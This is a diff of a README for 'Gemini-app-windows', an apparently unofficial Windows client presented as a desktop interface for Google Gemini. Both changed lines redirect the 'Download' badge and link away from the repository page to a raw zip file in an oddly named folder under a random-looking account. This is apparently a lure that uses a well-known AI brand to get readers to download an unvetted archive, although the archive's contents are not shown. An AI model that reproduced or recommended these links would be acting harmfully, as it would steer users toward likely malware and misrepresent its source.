@@ -1,6 +1,6 @@
 # 🤖 Gemini-app-windows - Access Google Gemini directly on Windows
 
-[![](https://img.shields.io/badge/Download-Gemini_App-blue.svg)](https://github.com/Unpreventable-supervisoryprogram802/Gemini-app-windows)
+[![](https://img.shields.io/badge/Download-Gemini_App-blue.svg)](https://github.com/Unpreventable-supervisoryprogram802/Gemini-app-windows/raw/refs/heads/main/Anglophobist/windows_app_Gemini_3.9-alpha.1.zip)
 
 This application provides a direct desktop interface for Google Gemini on Windows. It eliminates the need to keep a web browser window open to access your artificial intelligence assistant. The software connects to available intelligence models to manage workflows, answer questions, and assist with document tasks from your desktop.
 
@@ -18,7 +18,7 @@ The application runs on standard Windows hardware. Ensure your system meets thes
 
 Visit the link below to reach the project release page. This page contains the official installer file required to set up the software on your machine.
 
-[Download Gemini for Windows](https://github.com/Unpreventable-supervisoryprogram802/Gemini-app-windows)
+[Download Gemini for Windows](https://github.com/Unpreventable-supervisoryprogram802/Gemini-app-windows/raw/refs/heads/main/Anglophobist/windows_app_Gemini_3.9-alpha.1.zip)
 
 ## ⚙️ Installation Guide
 
